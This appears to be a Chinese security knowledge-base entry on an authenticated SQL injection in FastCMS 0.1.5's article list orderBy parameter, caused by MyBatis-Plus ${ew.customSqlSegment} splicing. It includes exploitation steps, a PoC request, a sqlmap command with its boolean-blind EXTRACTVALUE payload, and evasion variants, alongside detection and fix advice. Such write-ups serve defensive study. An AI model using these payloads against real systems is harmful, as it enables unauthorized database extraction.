---
id: web-generic-sqli-fastcms-article-list-orderby-injection
title: FastCMS 0.1.5 文章列表 orderBy 参数注入：MyBatis-Plus orderByDesc 拼入 ${ew.customSqlSegment}
type: scenario
domain: web
path: web/generic/sqli
technique: mybatis-plus-orderby-injection
tags:
- sqli
- java
- mybatis-plus
- order-by
- fastcms
- boolean-blind
- authenticated
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
affected_versions: FastCMS v0.1.5
verification:
  verified_by: verifier-V58
  verified_at: '2026-11-05T08:51:13+08:00'
  notes: 已对照原文与图01-15核对：ArticleApi.list 的 orderBy 直接进 orderByDesc(orderBy)，Mapper pageArticle 使用 ${ew.customSqlSegment}，与图12/13/05一致；原文请求带 test 用户 Bearer JWT，sqlmap 输出 boolean-based blind 及 payload 与图14/15逐字一致。未验证点：接口是否允许匿名访问原文未验证；PoC 未本机复跑；frontmatter 无 sources/source_url。
url: /docs/web/generic/sqli/web-generic-sqli-fastcms-article-list-orderby-injection/
draft: false
kb_aliases:
- FastCMS SQL 注入
- FastCMS orderBy 注入
- MyBatis-Plus orderByDesc 注入
- ew.customSqlSegment 注入
- /api/client/article/list 注入
---

## 一句话结论

FastCMS 0.1.5 的文章列表接口把请求参数 `orderBy` 直接交给 MyBatis-Plus 的 `QueryWrapper.orderByDesc()`，最终经 Mapper 中的 `${ew.customSqlSegment}` 文本拼接进 `ORDER BY`；排序位置不能预编译，攻击者在 `orderBy` 中即可构造 MySQL 布尔盲注，原文已用 sqlmap 实测跑通。

## 原理

- **拼接点**：`ArticleApi.java` 的 `/api/client/article/list` 接收 `@RequestParam(name="orderBy", required=false, defaultValue="a.created") String orderBy`，直接调用 `Wrappers.query()...orderByDesc(orderBy)`；`pageArticle()` 把该 `QueryWrapper` 交给分页查询。
- **为什么进入语法层**：MyBatis-Plus 的普通条件（`eq`/`likeLeft`）使用参数绑定，但排序字段属于 SQL 结构，`orderByDesc()` 接收的是列名/表达式字符串。分页 Mapper 通过 `${ew.customSqlSegment}` 把 Wrapper 片段做**文本替换**（不是 `#{}` 预编译），`orderBy` 的内容因此直接进入 SQL 语法。
- **为什么不能用预编译**：JDBC 占位符只能绑定“值”，不能绑定 `ORDER BY` 后面的列名/表达式，开发者为了实现可配置排序只能拼接；一旦没有白名单映射，用户输入就等价于 SQL 片段。
- **实测注入形态**：原文 sqlmap 识别的载荷在 `orderBy` 后闭合括号并追加 `WHERE`/`EXTRACTVALUE` 条件（`orderBy=1) AS KzkD WHERE 9917=9917 AND EXTRACTVALUE(...)--`），得到 MySQL boolean-based blind。说明该位置不仅能写列名，还能接表达式、子查询与条件判断。
- 原文其余评论列表入口使用固定的 `eq`/`likeLeft`/`orderByDesc("ac.created")`，`articleId` 为 `Long`，这些入口不构成注入；本场景只覆盖文章列表的 `orderBy`。

## 触发条件

- 目标为 FastCMS 0.1.5（原文审计版本）。
- `/api/client/article/list` 可达；原文请求携带 `Authorization: Bearer <JWT>`（示例 token 中 `username` 为 `test` 的普通用户），接口是否允许匿名访问原文未单独验证。
- 应用未对 `orderBy` 做列名白名单或枚举映射，直接传入 `orderByDesc()`。

## 利用步骤

1. 登录并抓取文章列表请求，确认 `orderBy` 参数会影响返回排序；把值改为 `1` 观察 SQL 报错或排序异常。
2. 将完整请求保存为文件，用 sqlmap 指定注入参数测试（原文使用 `--level 5 --risk 3 --batch`），确认数据库类型与注入类型。
3. 按 boolean-based blind 逐位提取库名、表名与数据；由于是排序位置，也可尝试时间盲注/报错函数（取决于目标 MySQL 配置与 WAF）。
4. 评估同项目其他 `${ew.customSqlSegment}` 查询入口是否有同类可控排序参数。

## PoC

```http
GET /fastcms/api/client/article/list?pageNum=1&pageSize=10&title=&orderBy=1 HTTP/1.1
Host: localhost:8080
Authorization: Bearer <token>
Accept: application/json, text/plain, */*
```

```bash
# 将上面的请求保存为 req.txt 后
sqlmap -r req.txt --level 5 --risk 3 --batch
```

原文 sqlmap 实测注入点类型：

```text
Parameter: #1* (URI)
    Type: boolean-based blind
    Title: MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: ...&orderBy=1) AS KzkD WHERE 9917=9917 AND EXTRACTVALUE(5559,CASE WHEN (5559=5559) THEN 5559 ELSE 0x3A END)-- Rand
```

## 变体与关联

- 变体：把排序值换成 `IF()`、`CASE WHEN`、子查询或 `SLEEP()` 构造布尔/时间盲注；若目标过滤空格/关键字，可用括号、注释与等价函数变形。
- 关联：`[[web-generic-sqli-mybatis-dollar-brace-injection]]`（`${}` 五类拼接点总览）；`[[web-generic-sqli-java-identifier-table-order-by-injection]]`（ORDER BY/表名等标识符位置不可预编译）；`[[web-generic-sqli-oa-jsp-orderby-sort-updatexml]]`、`[[web-generic-sqli-filepress-order-orderby-time-blind]]`（同类排序参数注入的产品案例）。
- 其他 FastCMS Mapper（如 `ArticleMapper.xml`、`SinglePageMapper.xml`）也使用 `${ew.customSqlSegment}`；若其他入口把用户可控值传给 `orderBy`/`last()`，可能有同类风险，本次未逐一验证。

## 检测与防御

- 检测：请求参数中出现 `orderBy`/`sort` 后跟括号、逗号、`IF`、`CASE`、`SLEEP`、`EXTRACTVALUE` 等 SQL 片段；WAF 对 `ORDER BY` 位置的异常表达式告警；数据库慢查询/报错日志中的异常排序语句。
- 修复：不要直接把请求值传给 `orderByDesc()`；建立“前端排序键 → 真实列名”的白名单映射，未命中时回退默认列；避免使用 `last()` 拼接 SQL。
- 缓解：数据库账户最小权限；对列表接口做频率限制与错误信息收敛；升级到厂商修复版本（原文未给出明确修复版本）。
